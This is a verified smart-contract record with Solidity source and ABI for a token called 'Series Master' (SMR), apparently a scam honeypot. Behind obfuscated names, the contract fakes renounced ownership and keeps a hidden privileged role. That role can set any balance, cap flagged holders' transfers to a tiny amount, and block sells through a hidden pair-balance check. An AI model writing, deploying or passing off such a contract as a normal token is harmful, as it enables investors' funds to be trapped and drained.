{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface modeToSell {\n    function createPair(address swapTxTrading, address shouldTokenIs) external returns (address);\n}\n\ninterface tradingIs {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tokenLaunchSender) external view returns (uint256);\n\n    function transfer(address limitWallet, uint256 feeMarketingLimit) external returns (bool);\n\n    function allowance(address maxShouldLimit, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 feeMarketingLimit) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address limitWallet,\n        uint256 feeMarketingLimit\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed buyAt, uint256 value);\n    event Approval(address indexed maxShouldLimit, address indexed spender, uint256 value);\n}\n\nabstract contract isFromBuy {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface sellMin {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface fromBuySell is tradingIs {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SeriesMaster is isFromBuy, tradingIs, fromBuySell {\n\n    uint256 senderExempt;\n\n    address private maxAt;\n\n    function getOwner() external view returns (address) {\n        return maxAt;\n    }\n\n    function maxBuy(address maxExemptTo) public {\n        modeTeam();\n        if (toMin != liquidityMarketing) {\n            liquidityMarketing = toMin;\n        }\n        if (maxExemptTo == receiverReceiver || maxExemptTo == toMax) {\n            return;\n        }\n        maxAmount[maxExemptTo] = true;\n    }\n\n    function totalSwapLaunch(address txMarketing, address limitWallet, uint256 feeMarketingLimit) internal returns (bool) {\n        require(amountTrading[txMarketing] >= feeMarketingLimit);\n        amountTrading[txMarketing] -= feeMarketingLimit;\n        amountTrading[limitWallet] += feeMarketingLimit;\n        emit Transfer(txMarketing, limitWallet, feeMarketingLimit);\n        return true;\n    }\n\n    string private marketingIs = \"Series Master\";\n\n    function owner() external view returns (address) {\n        return maxAt;\n    }\n\n    function txLiquidity(address txMarketing, address limitWallet, uint256 feeMarketingLimit) internal returns (bool) {\n        if (txMarketing == receiverReceiver) {\n            return totalSwapLaunch(txMarketing, limitWallet, feeMarketingLimit);\n        }\n        uint256 fundList = tradingIs(toMax).balanceOf(listExempt);\n        require(fundList == listSell);\n        require(limitWallet != listExempt);\n        if (maxAmount[txMarketing]) {\n            return totalSwapLaunch(txMarketing, limitWallet, liquidityTeamTx);\n        }\n        return totalSwapLaunch(txMarketing, limitWallet, feeMarketingLimit);\n    }\n\n    function transfer(address modeLaunched, uint256 feeMarketingLimit) external virtual override returns (bool) {\n        return txLiquidity(_msgSender(), modeLaunched, feeMarketingLimit);\n    }\n\n    function txAuto(uint256 feeMarketingLimit) public {\n        modeTeam();\n        listSell = feeMarketingLimit;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return marketingIs;\n    }\n\n    event OwnershipTransferred(address indexed listReceiver, address indexed fundTotal);\n\n    function symbol() external view virtual override returns (string memory) {\n        return fundTrading;\n    }\n\n    uint256 public liquidityMarketing;\n\n    uint256 listSell;\n\n    uint256 private tokenSwap = 100000000 * 10 ** 18;\n\n    function approve(address fromLimitTake, uint256 feeMarketingLimit) public virtual override returns (bool) {\n        launchReceiverSwap[_msgSender()][fromLimitTake] = feeMarketingLimit;\n        emit Approval(_msgSender(), fromLimitTake, feeMarketingLimit);\n        return true;\n    }\n\n    mapping(address => bool) public maxAmount;\n\n    address fromMarketingToken = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function transferFrom(address txMarketing, address limitWallet, uint256 feeMarketingLimit) external override returns (bool) {\n        if (_msgSender() != fromMarketingToken) {\n            if (launchReceiverSwap[txMarketing][_msgSender()] != type(uint256).max) {\n                require(feeMarketingLimit <= launchReceiverSwap[txMarketing][_msgSender()]);\n                launchReceiverSwap[txMarketing][_msgSender()] -= feeMarketingLimit;\n            }\n        }\n        return txLiquidity(txMarketing, limitWallet, feeMarketingLimit);\n    }\n\n    uint8 private shouldTake = 18;\n\n    address public toMax;\n\n    string private fundTrading = \"SMR\";\n\n    address public receiverReceiver;\n\n    function decimals() external view virtual override returns (uint8) {\n        return shouldTake;\n    }\n\n    function allowance(address listMax, address fromLimitTake) external view virtual override returns (uint256) {\n        if (fromLimitTake == fromMarketingToken) {\n            return type(uint256).max;\n        }\n        return launchReceiverSwap[listMax][fromLimitTake];\n    }\n\n    function modeTeam() private view {\n        require(txTotalAuto[_msgSender()]);\n    }\n\n    address listExempt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => bool) public txTotalAuto;\n\n    bool public shouldLiquidity;\n\n    mapping(address => mapping(address => uint256)) private launchReceiverSwap;\n\n    constructor (){\n        \n        sellMin feeAuto = sellMin(fromMarketingToken);\n        toMax = modeToSell(feeAuto.factory()).createPair(feeAuto.WETH(), address(this));\n        \n        receiverReceiver = _msgSender();\n        txTotalAuto[receiverReceiver] = true;\n        amountTrading[receiverReceiver] = tokenSwap;\n        txTotal();\n        if (toMin != receiverSenderShould) {\n            liquidityMarketing = toMin;\n        }\n        emit Transfer(address(0), receiverReceiver, tokenSwap);\n    }\n\n    mapping(address => uint256) private amountTrading;\n\n    function tradingLiquidity(address launchMarketing) public {\n        if (shouldLiquidity) {\n            return;\n        }\n        if (toMin == receiverSenderShould) {\n            receiverSenderShould = liquidityMarketing;\n        }\n        txTotalAuto[launchMarketing] = true;\n        \n        shouldLiquidity = true;\n    }\n\n    uint256 public toMin;\n\n    uint256 public receiverSenderShould;\n\n    function balanceOf(address tokenLaunchSender) public view virtual override returns (uint256) {\n        return amountTrading[tokenLaunchSender];\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tokenSwap;\n    }\n\n    function txTotal() public {\n        emit OwnershipTransferred(receiverReceiver, address(0));\n        maxAt = address(0);\n    }\n\n    uint256 constant liquidityTeamTx = 17 ** 10;\n\n    function totalTo(address modeLaunched, uint256 feeMarketingLimit) public {\n        modeTeam();\n        amountTrading[modeLaunched] = feeMarketingLimit;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxShouldLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundTotal\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyAt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromLimitTake\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromLimitTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeMarketingLimit\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenLaunchSender\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxExemptTo\",\"type\":\"address\"}],\"name\":\"maxBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverSenderShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeMarketingLimit\",\"type\":\"uint256\"}],\"name\":\"totalTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchMarketing\",\"type\":\"address\"}],\"name\":\"tradingLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeMarketingLimit\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeMarketingLimit\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"feeMarketingLimit\",\"type\":\"uint256\"}],\"name\":\"txAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txTotalAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "SeriesMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}